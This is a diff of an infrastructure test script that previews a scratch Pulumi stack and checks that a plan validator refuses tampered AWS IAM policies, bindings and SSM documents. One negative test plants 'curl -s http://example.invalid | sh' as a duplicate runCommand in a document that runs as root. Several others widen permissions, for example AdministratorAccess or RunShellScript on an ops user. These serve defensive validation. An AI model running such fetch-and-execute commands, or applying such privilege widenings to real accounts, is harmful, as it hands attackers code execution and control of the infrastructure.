@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # make preview-scratch [NEGATIVE=...] [EGRESS_MODE=none|firewall]: a full `pulumi preview` of a scratch COPY of infra/
-# against the real account, with a throwaway backend, passphrase and stack (D17; T3.2, T3.5; S5).
+# against the real account, with a throwaway backend, passphrase and stack (D17; T3.2, T3.5; S5; S8 operators).
 #
 # Why a copy: the agent must never touch Mike's backend, the dev stack or its passphrase, and the negatives edit
 # the program. Everything lives under target/image/pulumi-scratch (rebuilt on every run); node_modules is
@@ -12,24 +12,35 @@
 #
 # The normal run must succeed, then the plan check (scripts/check-plan.sh, the same one `make deploy` runs; always
 # the repo's copy, never the edited scratch copy) must accept the --json plan: exactly the stack inventory per type
-# and name (54 in dnsMode none: S3's 16 and S5's 38, the operator role's Deny included; EGRESS_MODE=firewall
-# previews the copy with dnsMode firewall: 59), the pinned providers, every egress input and reference, every IAM
-# document (for the caller's account, read once from `aws sts get-caller-identity` into a shell variable) and no
-# update of the parameters `ai-env egress` owns. A --json plan has no stack outputs, so the 14
-# egress outputs `ai-env infra status` reads are checked in the text preview, squidConfSha256 and allowSha256
-# against the SHA-256 of the planned parameter values. Then the same plan, rewritten in memory into the shape
-# `pulumi preview --json` gives for the stack once it exists (every step same, or the VM subnet, VM security group
-# and VPC as updates; each id in oldState only, every reference and IAM document resolved for those ids), must pass
-# too, also as the deploy that adds the operator role's Deny to it (its create step, everything else same), and
-# seven tampered copies of it (the deploy policy's CreateNetworkConnector condition or the operator role's Deny
-# naming the proxy subnet, the Deny also on that create step, where its document left unknown is refused too; the
-# connector on the proxy subnet or the proxy's security group, the connector passed another role) must be refused: a
-# fresh scratch stack only creates, and a check that saw only creates once refused every deploy after the first. The
-# operator role's Deny is proven compared there only: in a fresh preview its document is unknown (the subnet and
-# group ids are), which the plan check accepts only while a resource it depends on is being created; the ids it is
-# built from are checked by URN (NEGATIVE=miswired). The layers a negative goes through, each one alone (the
-# earlier ones disabled in the scratch copy through their scratch:* markers):
-#   spec   assertEgressSpec, before any resource is registered;
+# and name (67 in dnsMode none: S3's 16, S5's 38 with the operator role's Deny, and S8 operators' 13, the users
+# ai-env-deployer and ai-env-ops, the policies ai-env-deployer and ai-env-ops, the six user policy attachments and
+# the proxy's three SSM documents; EGRESS_MODE=firewall previews the copy with dnsMode firewall: 72), the pinned
+# providers, every egress input and reference, every IAM document (for the caller's account, read once from `aws sts
+# get-caller-identity` into a shell variable), who holds which policy, the documents' content (the files) and no
+# update of the parameters `ai-env egress` owns. A --json plan has no stack outputs, so the 25 outputs `ai-env infra
+# status` reads (S5's 14 egress outputs, S8 operators' 11) are checked in the text preview, squidConfSha256 and
+# allowSha256 against the SHA-256 of the planned parameter values. Then the same plan, rewritten in memory into the
+# shape `pulumi preview --json` gives for the stack once it exists (every step same, or the VM subnet, VM security
+# group and VPC as updates; each id in oldState only, every reference and IAM document resolved for those ids), must
+# pass too, also as the deploy that adds the operator role's Deny to it (its create step, everything else same) and
+# as the bootstrap (the stack before S8 operators: no user ai-env-deployer in the old state, the 13 creates, the three
+# deploy policies replaced for their frozen descriptions, which check-plan allows only then: D12), and twenty-one
+# tampered copies of it must be refused: the deploy policy's CreateNetworkConnector condition or the operator role's
+# Deny naming the proxy subnet, the Deny also on that create step, where its document left unknown is refused too; the
+# connector on the proxy subnet or the proxy's security group, the connector passed another role; ai-env-ops' policy
+# granting AWS-RunShellScript, writing every proxy parameter or starting any instance; AdministratorAccess attached to
+# ai-env-ops; ai-env-deploy replaced once the deployer exists; an attachment of the deployer deleted; MacRuntimePolicy
+# widened (moved here from NEGATIVE=iam-widen: its document names the connector's ARN, unknown in a fresh preview,
+# which the plan check accepts there); the aws provider replaced; ai-env-deploy's attachment binding ai-env-ops; an
+# attachment of the deployer replaced; the user ai-env-deployer replaced; the bootstrap creating ai-env-deployer before
+# its five policies; the status document's content carrying a duplicate key (it parses to the file, but is not the file);
+# MacRuntimePolicy bound to ai-env-ops (the daily key would hold the runtime grants).
+# A fresh scratch stack only creates, and a check that saw only creates once
+# refused every deploy after the first. The operator role's Deny is proven compared there only: in a fresh preview its
+# document is unknown (the subnet and group ids are), which the plan check accepts only while a resource it depends
+# on is being created; the ids it is built from are checked by URN (NEGATIVE=miswired). The layers a negative goes
+# through, each one alone (the earlier ones disabled in the scratch copy through their scratch:* markers):
+#   spec   assertEgressSpec and assertProxyDocuments, before any resource is registered;
 #   guard  the resource transform (egress.ts guardEgress), at registration;
 #   plan   the plan check over `pulumi preview --json`, after every transform.
 # Each negative succeeds only when every expected refusal happens, and prints the diagnostic that fired:
@@ -57,13 +68,26 @@
 #                    dnsMode firewall with qType "A" on the block-all rule (it would block A records only): guard, plan
 #   miswired         references the guard cannot compare in a preview (unknown ids): the route tables' associations
 #                    swapped, every rule attached to the proxy group, the proxy's ingress referencing itself, the
-#                    operator role's Deny built from the proxy subnet's id: plan
+#                    operator role's Deny built from the proxy subnet's id, ai-env-ops' policy built from the VM
+#                    subnet's id instead of the proxy instance's: plan
 #   iam-widen        AdministratorAccess in the exec role's managedPolicyArns (guard); then also an inline policy on
-#                    the operator role, a Widen statement in MacRuntimePolicy and ssm:* in the proxy's policy: plan
+#                    the operator role and ssm:* in the proxy's policy: plan (MacRuntimePolicy widened: an existing-
+#                    stack copy above)
 #   owned-param-reset
 #                    the --json plan with an update step on the suspended parameter and a replace step on the extras
 #                    one (what any change of theirs but tags would plan): plan (a fresh stack only creates, so the
 #                    steps are rewritten in the plan held in memory)
+#   identity-widen   S8 operators: AdministratorAccess attached to ai-env-ops instead of its policy (guard);
+#                    ai-env-deployer retained on delete, protected, or deleted with another resource (guard, each);
+#                    ai-env-deploy's attachment binding ai-env-ops (guard); MacRuntimePolicy on ai-env-ops instead
+#                    of ai-env-runtime (guard); an access key, a login profile, an
+#                    attachment of AdministratorAccess, a group membership, a PolicyAttachment and a
+#                    UserPolicyAttachmentsExclusive of ai-env-ops appended to index.ts (guard, each); all of them with
+#                    the deployer's attach condition widened to AdministratorAccess: plan
+#   document-widen   S8 operators: a free-form parameter used by the reload document's script (spec, guard, plan); an
+#                    {{ssm:…}} reference in the status document's script (spec, guard, plan); a second step in the
+#                    patch document (spec, guard, plan); the documents shared with every account (guard, plan); the
+#                    status document's script edited (guard, plan)
 #
 # Env (set by infra/infra.mk): AI_ENV_REPO_ROOT, REGION, IMAGE_JSON (absolute), SCRATCH, NEGATIVE, EGRESS_MODE.
 set -euo pipefail
@@ -75,7 +99,7 @@ negative=${NEGATIVE:-}
 mode=${EGRESS_MODE:-}
 real_image_json=${IMAGE_JSON:?}
 
-negatives="no-logging no-logging-cast region vm-sg-open private-route nacl-open dns-support-on-in-none-mode stray-rule stray-type late-transform early-transform dns-firewall-qtype miswired iam-widen owned-param-reset"
+negatives="no-logging no-logging-cast region vm-sg-open private-route nacl-open dns-support-on-in-none-mode stray-rule stray-type late-transform early-transform dns-firewall-qtype miswired iam-widen owned-param-reset identity-widen document-widen"
 case " $negatives " in *" $negative "*) ;; *) test -z "$negative" || { echo "preview-scratch: unknown NEGATIVE=$negative ($negatives)" >&2; exit 2; } ;; esac
 case "$mode" in "" | none | firewall) ;; *) echo "preview-scratch: unknown EGRESS_MODE=$mode (none, firewall)" >&2; exit 2 ;; esac
 if [ "$mode" = firewall ] && [ -n "$negative" ]; then echo "preview-scratch: EGRESS_MODE=firewall is a positive preview; run the negatives without it" >&2; exit 2; fi
@@ -157,10 +181,12 @@ json_plan() {
     preview 2>&1 | grep -E 'error|Error' | head -5 >&2 || true
     return 1
 }
-# Disable a layer in the scratch copy, so the next one alone must refuse.
+# Disable a layer in the scratch copy, so the next one alone must refuse (the spec layer: both asserts of index.ts).
 no_spec() {
-    edit_file index.ts '/scratch:assert/s/assertEgressSpec(egress);/void assertEgressSpec;/'
+    edit_file index.ts '/scratch:assert$/s/assertEgressSpec(egress);/void assertEgressSpec;/' \
+        '/scratch:assert-documents$/s/assertProxyDocuments(documents);/void assertProxyDocuments;/'
     grep -qF 'void assertEgressSpec; // scratch:assert' index.ts || fail "the scratch:assert marker no longer disables assertEgressSpec"
+    grep -qF 'void assertProxyDocuments; // scratch:assert-documents' index.ts || fail "the scratch:assert-documents marker no longer disables assertProxyDocuments"
 }
 no_guard() {
     edit_file egress.ts '/scratch:guard/s/pulumi.runtime.registerResourceTransform(guard);/void guard;/'
@@ -195,15 +221,27 @@ expect_plan_refusal() {
 
 # existing_plan <variant>: the --json plan on stdin, rewritten into the shape of the same stack once it exists
 # (pulumi 3.266: one step per resource, op same; newState without an id, oldState with it): an id per resource
-# (a role's, user's or instance profile's is its name, the bucket's its name, a subnet's subnet-…, a group's
-# sg-…), every unknown input resolved through its property dependencies, the IAM documents rendered by policies.ts
-# for those ids (the compiled copy plan_check left in $scratch/plan-check). <variant>: none | updated (the VM subnet,
-# the VM security group and the VPC are update steps: their ids, too, come from oldState) | operator-new (the deploy
-# that adds the operator role's Deny: its step is a create without oldState) | deploy-proxy-subnet (the deploy
-# policy names the proxy subnet) | operator-proxy-subnet (the operator role's Deny names the proxy subnet) |
-# operator-new-proxy-subnet (so does its create step) | operator-new-unknown (its create step's document is unknown,
-# everything it depends on same) | connector-proxy-subnet (the connector's subnet is the proxy subnet) |
-# connector-proxy-sg (its security group is the proxy's) | connector-operator-role (it is passed another role).
+# (a role's, user's, instance profile's or document's is its name, a managed policy's its ARN, the connector's its ARN,
+# the bucket's its name, a subnet's subnet-…, a group's sg-…, the instance's i-…), every unknown input resolved through
+# its property dependencies, the IAM documents rendered by policies.ts for those ids (the compiled copy plan_check left
+# in $scratch/plan-check). <variant>: none | updated (the VM subnet, the VM security group and the VPC are update
+# steps: their ids, too, come from oldState) | operator-new (the deploy that adds the operator role's Deny: its step
+# is a create without oldState) | bootstrap (S8 operators' bootstrap, D12: the 13 operator resources created, the
+# three deploy policies replaced for their new descriptions, everything else same; no user ai-env-deployer in the old
+# state) | deploy-proxy-subnet (the deploy policy names the proxy subnet) | operator-proxy-subnet (the operator role's
+# Deny names the proxy subnet) | operator-new-proxy-subnet (so does its create step) | operator-new-unknown (its create
+# step's document is unknown, everything it depends on same) | connector-proxy-subnet (the connector's subnet is the
+# proxy subnet) | connector-proxy-sg (its security group is the proxy's) | connector-operator-role (it is passed
+# another role) | ops-runshell (ai-env-ops may send AWS-RunShellScript) | ops-extras (it may write every proxy
+# parameter) | ops-any-instance (it may start and stop any instance) | ops-attach-admin (AdministratorAccess attached to
+# ai-env-ops, its dependency kept) | policy-replaced (ai-env-deploy replaced once the deployer exists) |
+# deployer-detached (the deployer's attachment of ai-env-ops deleted: a delete step, its old state only) | runtime-widen
+# (MacRuntimePolicy with a Widen statement) | provider-replaced (the aws provider replaced) | ops-holds-deploy
+# (ai-env-deploy's attachment binds ai-env-ops, by value and by URN) | attachment-replaced (the deployer's attachment
+# of its supplement replaced) | deployer-replaced (the user ai-env-deployer replaced, delete before replace) |
+# bootstrap-unordered (the bootstrap with ai-env-deployer depending on none of its five policies) |
+# document-duplicate-key (the status document's content with a second runCommand key before its own) |
+# runtime-policy-on-ops (MacRuntimePolicy binds ai-env-ops, by value and by URN).
 existing_plan() {
     ACCOUNT_ID="$acct" node -e '
 const fs = require("fs");
@@ -213,6 +251,7 @@ const spec = require(`${out}/egress-spec.js`);
 const cfg = spec.loadEgressConfig(egressConfig);
 const img = JSON.parse(fs.readFileSync(imageConfig, "utf-8"));
 const plan = JSON.parse(fs.readFileSync(0, "utf-8"));
+const acct = process.env.ACCOUNT_ID;
 const UNKNOWN = "04da6b54-80e4-46f7-96ec-b56ff0331ba9";
 const name = (s) => s.urn.split("::").pop();
 const type = (s) => (s.newState || s.oldState).type;
@@ -221,9 +260,12 @@ let n = 0;
 for (const s of plan.steps) {
     const t = type(s), i = (s.newState || {}).inputs || {}, k = n++;
     const hex = (p) => `${p}-0${k.toString(16).padStart(16, "0")}`;
-    ids.set(s.urn, t === "aws:iam/role:Role" || t === "aws:iam/user:User" || t === "aws:iam/instanceProfile:InstanceProfile" ? i.name
+    ids.set(s.urn, ["aws:iam/role:Role", "aws:iam/user:User", "aws:iam/instanceProfile:InstanceProfile", "aws:ssm/document:Document"].includes(t) ? i.name
+        : t === "aws:iam/policy:Policy" ? `arn:aws:iam::${acct}:policy/${i.name}`
+        : t === "aws-native:lambda:NetworkConnector" ? `arn:aws:lambda:${pol.REGION}:${acct}:network-connector:nc-${k.toString(16).padStart(17, "0")}`
         : t === "aws:s3/bucket:Bucket" ? i.bucket
         : t === "aws:ec2/subnet:Subnet" ? hex("subnet") : t === "aws:ec2/securityGroup:SecurityGroup" ? hex("sg") : t === "aws:ec2/vpc:Vpc" ? hex("vpc")
+        : t === "aws:ec2/instance:Instance" ? hex("i")
         : t.startsWith("pulumi:providers:") ? `00000000-0000-4000-8000-${k.toString(16).padStart(12, "0")}` : hex("id"));
 }
 const byName = (t, nm) => plan.steps.find((s) => type(s) === t && name(s) === nm);
@@ -233,15 +275,33 @@ const vmSg = ids.get(byName("aws:ec2/securityGroup:SecurityGroup", cfg.vmSecurit
 const proxySg = ids.get(byName("aws:ec2/securityGroup:SecurityGroup", cfg.proxySecurityGroupName).urn);
 const updated = new Set([byName("aws:ec2/subnet:Subnet", "ai-env-egress-vms").urn, byName("aws:ec2/securityGroup:SecurityGroup", cfg.vmSecurityGroupName).urn, byName("aws:ec2/vpc:Vpc", "ai-env-egress").urn]);
 const bucket = ids.get(plan.steps.find((s) => type(s) === "aws:s3/bucket:Bucket").urn);
-const names = (subnet) => ({ accountId: process.env.ACCOUNT_ID, region: pol.REGION, bucket, imageName: img.imageName, logGroup: img.logGroup,
-    egress: { ...spec.egressNames(cfg), vmSubnetId: subnet, vmSecurityGroupId: vmSg } });
+// The connector ARN (the runtime policy, S7 D5) and the proxy instance id (the ops policy, S8 operators).
+const connectorArn = ids.get(byName("aws-native:lambda:NetworkConnector", cfg.connectorName).urn);
+const proxyInstanceId = ids.get(byName("aws:ec2/instance:Instance", "ai-env-egress-proxy").urn);
+const names = (subnet) => ({ accountId: acct, region: pol.REGION, bucket, imageName: img.imageName, logGroup: img.logGroup,
+    egress: { ...spec.egressNames(cfg), vmSubnetId: subnet, vmSecurityGroupId: vmSg, connectorArn, proxyInstanceId } });
 const docs = (subnet) => new Map(pol.allPolicies(names(subnet)).map((d) => [d.name, JSON.stringify(d.document)]));
 const good = docs(vmSubnet), bad = docs(proxySubnet);
 // Which document each IAM input is (print-policies names).
 const doc = { "aws:iam/role:Role": { "ai-env-image-build": "build-trust", "ai-env-vm-exec": "execution-trust", [cfg.proxyRoleName]: "proxy-trust", [cfg.operatorRoleName]: "operator-trust" },
     "aws:iam/rolePolicy:RolePolicy": { "ai-env-image-build": "build", "ai-env-vm-exec": "execution", [cfg.proxyRoleName]: "proxy", [cfg.operatorRoleName]: "operator" },
     "aws:iam/userPolicy:UserPolicy": { MacRuntimePolicy: "runtime" },
-    "aws:iam/policy:Policy": { "ai-env-deploy": "deploy", "ai-env-deploy-egress": "deploy-egress", "ai-env-deploy-dns": "deploy-dns" } };
+    "aws:iam/policy:Policy": { "ai-env-deploy": "deploy", "ai-env-deploy-egress": "deploy-egress", "ai-env-deploy-dns": "deploy-dns", "ai-env-deployer": "deployer", "ai-env-ops": "ops" } };
+// The tampered documents: [which document, the edit of its parsed JSON].
+const statement = (d, sid) => d.Statement.find((x) => x.Sid === sid);
+const edits = {
+    "ops-runshell": ["ops", (d) => statement(d, "ProxyCommands").Resource.push(`arn:aws:ssm:${pol.REGION}::document/AWS-RunShellScript`)],
+    "ops-extras": ["ops", (d) => { statement(d, "WriteSuspendedParameter").Resource = [pol.proxyParameterArn(names(vmSubnet))]; }],
+    "ops-any-instance": ["ops", (d) => { statement(d, "ProxyInstance").Resource = [`arn:aws:ec2:${pol.REGION}:${acct}:instance/*`]; }],
+    "runtime-widen": ["runtime", (d) => d.Statement.push({ Sid: "Widen", Effect: "Allow", Action: ["*"], Resource: ["*"] })],
+};
+const render = (which, text) => {
+    const e = edits[variant];
+    if (e === undefined || e[0] !== which) return text;
+    const d = JSON.parse(text);
+    e[1](d);
+    return JSON.stringify(d);
+};
 // resolve(value, deps, key): every unknown in value, the id of its one dependency (under a connector list key, the
 // dependency of that kind); with several, a placeholder (a by-value check against it can only refuse, never pass).
 const resolve = (v, deps, key) => {
@@ -260,7 +320,7 @@ for (const s of plan.steps) {
         const which = (doc[st.type] || {})[name(s)];
         const iamKey = st.type === "aws:iam/role:Role" ? "assumeRolePolicy" : "policy";
         const tampered = (variant === "deploy-proxy-subnet" && which === "deploy") || ((variant === "operator-proxy-subnet" || variant === "operator-new-proxy-subnet") && which === "operator");
-        inputs[k] = which && k === iamKey ? ((tampered ? bad : good).get(which) ?? v) : resolve(v, (st.propertyDependencies || {})[k] || [], k);
+        inputs[k] = which && k === iamKey ? render(which, (tampered ? bad : good).get(which) ?? v) : resolve(v, (st.propertyDependencies || {})[k] || [], k);
     }
     if (st.type === "aws-native:lambda:NetworkConnector") {
         // An ARN cannot be resolved from its two dependencies (the role and its attachment): it is the ARN of the operator role.
@@ -268,9 +328,27 @@ for (const s of plan.steps) {
         if (variant === "connector-proxy-subnet") inputs.configuration.vpcEgressConfiguration.subnetIds = [proxySubnet];
         if (variant === "connector-proxy-sg") inputs.configuration.vpcEgressConfiguration.securityGroupIds = [proxySg];
     }
+    // ops-attach-admin: the ops user holds AdministratorAccess instead of its policy (the dependency on it kept).
+    if (variant === "ops-attach-admin" && st.type === "aws:iam/userPolicyAttachment:UserPolicyAttachment" && name(s) === pol.attachmentName(pol.OPS_USER_NAME, pol.OPS_POLICY_NAME)) {
+        inputs.policyArn = "arn:aws:iam::aws:policy/AdministratorAccess";
+    }
+    // ops-holds-deploy: the attachment named for the deployer and ai-env-deploy binds the ops user instead, by value and
+    // by URN (a swapped user map in iam.ts): the daily key would deploy.
+    const opsHoldsDeploy = variant === "ops-holds-deploy" && st.type === "aws:iam/userPolicyAttachment:UserPolicyAttachment"
+        && name(s) === pol.attachmentName(pol.DEPLOYER_USER_NAME, pol.DEPLOY_POLICY_NAME);
+    // runtime-policy-on-ops: MacRuntimePolicy binds the ops user instead, by value and by URN (a swapped user in iam.ts):
+    // the daily key would hold the runtime grants (RunMicrovm, the shell token, PassRole on the execution role).
+    const runtimeOnOps = variant === "runtime-policy-on-ops" && st.type === "aws:iam/userPolicy:UserPolicy" && name(s) === pol.RUNTIME_POLICY_NAME;
+    const toOps = opsHoldsDeploy || runtimeOnOps;
+    if (toOps) inputs.user = pol.OPS_USER_NAME;
     const kept = { ...st, inputs };
     delete kept.id;
+    if (toOps) kept.propertyDependencies = { ...(st.propertyDependencies || {}), user: [byName("aws:iam/user:User", pol.OPS_USER_NAME).urn] };
     s.op = variant === "updated" && updated.has(s.urn) ? "update" : "same";
+    // policy-replaced: a policy the deployer holds is replaced once the deployer exists (D12 refuses it).
+    if (variant === "policy-replaced" && st.type === "aws:iam/policy:Policy" && name(s) === pol.DEPLOY_POLICY_NAME) s.op = "replace";
+    // attachment-replaced: an attachment of the deployer is replaced once the deployer exists (D12 refuses it too).
+    if (variant === "attachment-replaced" && st.type === "aws:iam/userPolicyAttachment:UserPolicyAttachment" && name(s) === pol.attachmentName(pol.DEPLOYER_USER_NAME, pol.DEPLOYER_POLICY_NAME)) s.op = "replace";
     s.newState = kept;
     s.oldState = st.type === "pulumi:pulumi:Stack" ? { ...kept } : { ...kept, id: ids.get(s.urn), outputs: { ...inputs, id: ids.get(s.urn) } };
     if (st.provider) {
@@ -289,6 +367,63 @@ plan.steps.forEach((s) => walk(s, name(s)));
 if (left.length > 0) throw new Error(`existing_plan: unknown values left at ${left.slice(0, 8).join(", ")}`);
 // operator-new-unknown: that create step with its document unknown, though nothing it depends on is created.
 if (variant === "operator-new-unknown") byName("aws:iam/rolePolicy:RolePolicy", cfg.operatorRoleName).newState.inputs.policy = UNKNOWN;
+// deployer-detached: the deployer no longer holds ai-env-ops: its attachment is deleted (a delete step: the old state
+// only, as pulumi plans a resource the program no longer registers).
+const detached = `aws:iam/userPolicyAttachment:UserPolicyAttachment::${pol.attachmentName(pol.DEPLOYER_USER_NAME, pol.OPS_POLICY_NAME)}`;
+if (variant === "deployer-detached") {
+    const s = plan.steps.find((x) => `${type(x)}::${name(x)}` === detached);
+    s.op = "delete";
+    delete s.newState;
+}
+// The three steps of a replacement (their order does not matter to the plan check).
+const replacedSteps = (s, old) => [{ ...s, op: "delete-replaced", oldState: old, newState: undefined }, { ...s, op: "replace", oldState: old }, { ...s, op: "create-replacement", oldState: old }];
+// deployer-replaced: the user ai-env-deployer is replaced once it exists (D12 refuses it).
+if (variant === "deployer-replaced") {
+    plan.steps = plan.steps.flatMap((s) => (type(s) === "aws:iam/user:User" && name(s) === pol.DEPLOYER_USER_NAME ? replacedSteps(s, s.oldState) : [s]));
+}
+// provider-replaced: the pinned aws provider is replaced (it would replace every resource it manages): always refused.
+if (variant === "provider-replaced") plan.steps = plan.steps.flatMap((s) => (type(s) === "pulumi:providers:aws" ? replacedSteps(s, s.oldState) : [s]));
+// document-duplicate-key: the status document with a runCommand key before its own. JSON.parse keeps the last one, so
+// the content parses to the file, but SSM receives the string as it is (and whichever key it keeps runs as root).
+if (variant === "document-duplicate-key") {
+    const inputs = byName("aws:ssm/document:Document", spec.documentNames(cfg).status).newState.inputs;
+    const tampered = inputs.content.replace("\"runCommand\":[", "\"runCommand\":[\"curl -s http://example.invalid | sh\"],\"runCommand\":[");
+    if (tampered === inputs.content) throw new Error("existing_plan document-duplicate-key: no runCommand in the status document");
+    inputs.content = tampered;
+}
+// bootstrap (D12): the stack before S8 operators, as the account root deploys it once. The users ai-env-deployer and
+// ai-env-ops, their two policies, the six attachments and the three documents are created (no oldState: the old state
+// holds no user ai-env-deployer); the three deploy policies are replaced, delete before replace (an explicit name),
+// for their frozen descriptions; a created or replaced policy has no ARN yet, so the attachments name it unknown.
+// bootstrap-unordered: the same, with ai-env-deployer created before its five policies (it depends on none of them).
+if (variant === "bootstrap" || variant === "bootstrap-unordered") {
+    const key = (s) => `${type(s)}::${name(s)}`;
+    const created = new Set([
+        ...[pol.DEPLOYER_USER_NAME, pol.OPS_USER_NAME].map((u) => `aws:iam/user:User::${u}`),
+        ...[pol.DEPLOYER_POLICY_NAME, pol.OPS_POLICY_NAME].map((p) => `aws:iam/policy:Policy::${p}`),
+        ...pol.USER_POLICY_ATTACHMENTS.map(([u, p]) => `aws:iam/userPolicyAttachment:UserPolicyAttachment::${pol.attachmentName(u, p)}`),
+        ...spec.DOCUMENT_ROLES.map((r) => `aws:ssm/document:Document::${spec.documentNames(cfg)[r]}`),
+    ]);
+    const replaced = new Set([pol.DEPLOY_POLICY_NAME, pol.DEPLOY_EGRESS_POLICY_NAME, pol.DEPLOY_DNS_POLICY_NAME].map((p) => `aws:iam/policy:Policy::${p}`));
+    const steps = [];
+    let counted = 0;
+    for (const s of plan.steps) {
+        if (created.has(key(s))) {
+            s.op = "create";
+            delete s.oldState;
+            if (type(s) === "aws:iam/userPolicyAttachment:UserPolicyAttachment") s.newState.inputs.policyArn = UNKNOWN;
+            steps.push(s);
+            counted++;
+        } else if (replaced.has(key(s))) {
+            const old = { ...s.oldState, inputs: { ...s.oldState.inputs, description: "(the description it had before the bootstrap)" } };
+            steps.push(...replacedSteps(s, old));
+            counted++;
+        } else steps.push(s);
+    }
+    if (counted !== created.size + replaced.size) throw new Error(`existing_plan bootstrap: ${counted} of the ${created.size} created and ${replaced.size} replaced resources are in the plan`);
+    plan.steps = steps;
+    if (variant === "bootstrap-unordered") byName("aws:iam/user:User", pol.DEPLOYER_USER_NAME).newState.dependencies = [];
+}
 process.stdout.write(JSON.stringify(plan));
 ' "$scratch/plan-check" "$scratch/infra/egress-config.json" "$scratch/infra/image-config.json" "$1"
 }
@@ -304,11 +439,13 @@ case "$negative" in
     echo "$out"
     plan=$(json_plan) || fail "pulumi preview --json failed (the text preview above passed)"
     plan_check <<<"$plan" || fail "the plan check refused the plan (above)"
-    # A --json plan has no stack outputs: the egress outputs `ai-env infra status` reads, from the text preview, and
-    # the two parameter hashes against the SHA-256 of the planned values.
+    # A --json plan has no stack outputs: the egress and operator outputs `ai-env infra status` reads, from the text
+    # preview, and the two parameter hashes against the SHA-256 of the planned values.
     outputs=$(sed -n '/--outputs:--/,/^Resources:/p' <<<"$out")
     for k in connectorArn connectorName proxyPrivateIp proxyInstanceId egressVpcId vmSubnetId vmEgressSecurityGroupId proxySecurityGroupId \
-        operatorRoleArn egressLogGroup dnsMode parameterPrefix squidConfSha256 allowSha256; do
+        operatorRoleArn egressLogGroup dnsMode parameterPrefix squidConfSha256 allowSha256 \
+        deployerUserName deployerUserArn opsUserName opsUserArn deployerPolicyArn opsPolicyArn deployEgressPolicyArn deployDnsPolicyArn \
+        proxyReloadDocument proxyStatusDocument proxyPatchDocument; do
         grep -qE "^ +$k +: " <<<"$outputs" || fail "the preview plans no stack output $k"
     done
     for p in squid.conf allow; do
@@ -321,29 +458,62 @@ process.stdout.write(s ? require("crypto").createHash("sha256").update(s.newStat
 ' "ai-env-proxy-$p" <<<"$plan")
         test -n "$got" && test "$got" = "$want" || fail "output $k (${got:-none}) is not the SHA-256 of the planned $p parameter value (${want:-none})"
     done
-    # The same stack once it exists: the plan check must accept it (ids from oldState, for same and update steps; and
-    # the deploy that adds the Deny, whose document is known then) and refuse it tampered.
-    for v in none updated operator-new; do
+    # The same stack once it exists: the plan check must accept it (ids from oldState, for same and update steps; the
+    # deploy that adds the Deny, whose document is known then; S8 operators' bootstrap, D12) and refuse it tampered.
+    for v in none updated operator-new bootstrap; do
         existing=$(existing_plan "$v" <<<"$plan") || fail "existing stack, $v: the plan could not be rewritten"
         out=$(plan_check <<<"$existing" 2>&1) || { echo "$out"; fail "existing stack, $v: the plan check refused the plan of the deployed stack (ids in oldState)"; }
         echo "existing stack, $v: $(first_line "check-plan: ok" "$out")"
     done
-    for v in deploy-proxy-subnet operator-proxy-subnet operator-new-proxy-subnet operator-new-unknown connector-proxy-subnet connector-proxy-sg connector-operator-role; do
+    for v in deploy-proxy-subnet operator-proxy-subnet operator-new-proxy-subnet operator-new-unknown connector-proxy-subnet connector-proxy-sg connector-operator-role \
+        ops-runshell ops-extras ops-any-instance ops-attach-admin policy-replaced deployer-detached runtime-widen provider-replaced ops-holds-deploy \
+        attachment-replaced deployer-replaced bootstrap-unordered document-duplicate-key runtime-policy-on-ops; do
+        t2=
         case "$v" in
         deploy-proxy-subnet) t="aws:iam/policy:Policy ai-env-deploy: policy is not policies.ts deployPolicy()" ;;
         operator-proxy-subnet | operator-new-proxy-subnet) t="aws:iam/rolePolicy:RolePolicy ai-env-egress-operator: policy is not policies.ts operatorRolePolicy()" ;;
         operator-new-unknown) t="aws:iam/rolePolicy:RolePolicy ai-env-egress-operator: policy is unknown on a create step whose inputs all exist" ;;
         connector-proxy-subnet) t="connector: subnetIds is not the VM subnet" ;;
         connector-proxy-sg) t="connector: securityGroupIds is not the VM security group" ;;
-        *) t="connector: operatorRole arn:aws:iam::" ;;
+        connector-operator-role) t="connector: operatorRole arn:aws:iam::" ;;
+        ops-runshell | ops-extras | ops-any-instance) t="aws:iam/policy:Policy ai-env-ops: policy is not policies.ts opsPolicy(); a statement differs" ;;
+        ops-attach-admin) t="aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-ops--ai-env-ops: policyArn arn:aws:iam::aws:policy/AdministratorAccess is not arn:aws:iam::" ;;
+        policy-replaced) t="aws:iam/policy:Policy ai-env-deploy: a replace step of ai-env-deployer's identity" ;;
+        deployer-detached)
+            t="aws:iam/userPolicyAttachment:UserPolicyAttachment: missing from the plan: ai-env-deployer--ai-env-ops"
+            t2="aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-ops: a delete step of ai-env-deployer's identity"
+            ;;
+        runtime-widen) t="aws:iam/userPolicy:UserPolicy MacRuntimePolicy: policy is not policies.ts runtimePolicy(); extra statements Widen" ;;
+        provider-replaced)
+            t="pulumi:providers:aws aws-$REGION: a replace step of a provider"
+            t2="pulumi:providers:aws aws-$REGION: a create-replacement step of a provider"
+            ;;
+        ops-holds-deploy)
+            t="aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-deploy: user depends on aws:iam/user:User::ai-env-ops, expected aws:iam/user:User::ai-env-deployer"
+            t2="aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-deploy: user ai-env-ops is not ai-env-deployer"
+            ;;
+        attachment-replaced) t="aws:iam/userPolicyAttachment:UserPolicyAttachment ai-env-deployer--ai-env-deployer: a replace step of ai-env-deployer's identity" ;;
+        deployer-replaced)
+            t="aws:iam/user:User ai-env-deployer: a delete-replaced step of ai-env-deployer's identity"
+            t2="aws:iam/user:User ai-env-deployer: a create-replacement step of ai-env-deployer's identity"
+            ;;
+        bootstrap-unordered) t="aws:iam/user:User ai-env-deployer: a create step that does not depend on aws:iam/policy:Policy::ai-env-deploy" ;;
+        document-duplicate-key) t="aws:ssm/document:Document ai-env-proxy-status: content is not infra/proxy/documents/status.json" ;;
+        runtime-policy-on-ops)
+            t="aws:iam/userPolicy:UserPolicy MacRuntimePolicy: user depends on aws:iam/user:User::ai-env-ops, expected aws:iam/user:User::ai-env-runtime"
+            t2="aws:iam/userPolicy:UserPolicy MacRuntimePolicy: user ai-env-ops is not ai-env-runtime"
+            ;;
+        *) fail "existing stack, $v: no expected refusal" ;;
         esac
         tampered=$(existing_plan "$v" <<<"$plan") || fail "existing stack, $v: the plan could not be rewritten"
         if out=$(plan_check <<<"$tampered" 2>&1); then echo "$out"; fail "existing stack, $v: the plan check passed"; fi
